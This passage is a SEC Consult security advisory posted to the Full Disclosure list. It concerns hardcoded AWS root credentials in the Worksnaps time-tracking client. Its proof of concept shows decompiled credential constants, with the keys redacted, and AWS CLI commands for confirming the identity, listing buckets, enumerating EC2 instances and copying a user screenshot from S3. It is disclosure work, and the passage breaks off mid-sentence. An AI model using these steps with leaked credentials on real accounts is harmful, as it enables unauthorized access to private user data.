---
title: SEC Consult SA-20260618-0 :: Hardcoded Root Cloud Credentials in Application Binaries in Silver Leaf Technologies - Worksnaps.net Worksnaps
url: https://seclists.org/fulldisclosure/2026/Jun/21
source: Full Disclosure
date: 2026-06-21
fetch_date: 2026-06-22T07:17:00.226816
---

# SEC Consult SA-20260618-0 :: Hardcoded Root Cloud Credentials in Application Binaries in Silver Leaf Technologies - Worksnaps.net Worksnaps

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](20)
[By Date](date.html#21)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](20)
[By Thread](index.html#21)
[![Next](/images/right-icon-16x16.png)](15)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20260618-0 :: Hardcoded Root Cloud Credentials in Application Binaries in Silver Leaf Technologies - Worksnaps.net Worksnaps

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 18 Jun 2026 06:54:22 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20260618-0 >
=======================================================================
              title: Hardcoded Root Cloud Credentials in Application Binaries
            product: Silver Leaf Technologies - Worksnaps.net Worksnaps
 vulnerable version: <1.6.20260201
      fixed version: 1.6.20260201
         CVE number: CVE-2025-10560
             impact: critical
           homepage:https://www.worksnaps.net
              found: 2025-05-21
                 by: Thorger Jansen (Office Bochum)
                     Daniel Hirschberger
                     Tobias Niemann (Office Bochum)
                     Marius Renner (Office Bochum)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Atos business
                     Europe | Asia

                     https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"We are a small company with strong entrepreneurial spirit. We are here to
provide a different way of time tracking, specifically designed for remote
work. We believe in small teams, solid development and great design. We believe
that no business is too small to serve."
"Worksnaps is a time-tracking system which enable verification of time and
work. By using Worksnaps Client, a program running on users' desktop, the
users' work activities are sampled and sent to the server. We call them
"worksnaps".

Source:https://www.worksnaps.net/www/index.shtml
Source:https://alternativeto.net/software/worksnaps/about/

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately. The
vendor also implemented server-side fixes to remediate some identified
issues.

SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.

Vulnerability overview/description:
-----------------------------------
1) Hardcoded Cloud Credentials in Application Binaries (CVE-2025-10560)
Several application binaries contained hardcoded credentials, such as AWS access
keys and S3 bucket names, which granted access to the production environment.

Those hardcoded AWS cloud credentials in the Worksnaps client gave an
attacker complete access the Worksnaps AWS infrastructure as AWS root
account. An attacker got access to S3 buckets with sensitive data, such as
screenshots of user desktops.

Proof of concept:
-----------------
1) Hardcoded Cloud Credentials in Application Binaries (CVE-2025-10560)
After installing the application, there are various binaries in
"C:\Program Files (x86)\Worksnaps".

Several of those binaries can be analyzed by using the "ILSpy" tool and
contain valid credentials.

For example the binary procUploadDirect.net45.v2.exe contains the following
AWS Credentials:
--------------------------------------------------------------------------------
private const string DEFAULT_AWS_ACCESS_KEY = "[REDACTED]";
private const string DEFAULT_AWS_SECRET_KEY = "[REDACTED]";
private const string DEFAULT_REGION_NAME = "USEast1";
private const string BUCKET_NAME = "bbbb_hyoung";
private static string TEMP_BUCKET_NAME = "temp-prod";
private static string PERM_BUCKET_NAME_FULL = "perm-prod";
private static string PERM_BUCKET_NAME_THUMB = "perm-prod2";
private static RegionEndpoint Region = RegionEndpoint.USEast1;
--------------------------------------------------------------------------------

Using these credentials several AWS actions could be performed by an attacker.

First, the identity of the caller can be retrieved with the command
"aws sts get-caller-identity":
--------------------------------------------------------------------------------
$ aws sts get-caller-identity
{
    "UserId": "227929[REDACTED]",
    "Account": "227929[REDACTED]",
    "Arn": "arn:aws:iam::227929[REDACTED]:root"
}
--------------------------------------------------------------------------------

This shows that the credentials in use are valid and it provides key details
about the AWS identity, including the Account ID, User ID, and ARN (Amazon
Resource Name) of the entity making the call.

Then, all S3 buckets can be listed with the command "aws s3api list-buckets":
--------------------------------------------------------------------------------
$ aws s3api list-buckets
{
    "Buckets": [
        {
            "Name": "aws-cloudtrail-logs-[REDACTED]-ssfull",
            "CreationDate": "2022-12-11T06:27:46+00:00"
        },
[...]
--------------------------------------------------------------------------------

This shows that the credentials in use have sufficient permissions (typically
s3:ListAllMyBuckets) to enumerate all S3 buckets associated with the AWS
account. The output will include the names and creation dates of each bucket,
which can help identify targets of interest for further enumeration or data
access.

Also, by using the command "describe-instances" an attacker can retrieve
detailed information about all EC2 instances in the account:

--------------------------------------------------------------------------------
$ aws ec2 describe-instances
{
    "Reservations": [
        {
            "ReservationId": "[REDACTED]",
            "OwnerId": "227929[REDACTED]",
            "Groups": [],
            "Instances": [
                {
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/xvda",
                            "Ebs": {
                                "AttachTime": "2019-05-28T02:39:54+00:00",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "[REDACTED]61769"
                            }
                        }
                    ],
[...]
--------------------------------------------------------------------------------

This shows that the credentials in use have the ec2:DescribeInstances permission,
allowing the enumeration of instance metadata such as instance IDs, public and
private IP addresses, and more.

Finally, by using "aws s3 cp" an attacker could attempt to copy objects from a
target S3 bucket to their local system. In this case one of the generated
screenshots is directly fetched from the S3 bucket instead of the web
interface. Note: SEC Consult only requested data from our own associated
accounts. No data of other customers was accessed.

--------------------------------------------------------------------------------
$ aws s3 cp s3://ssfull-prod/screen_754275513.jpg output.jpg
download: s3://ssfull-prod/screen_754275513.jpg to ./output.jpg
--------------------------------------------------------------------------------

This shows that the creden...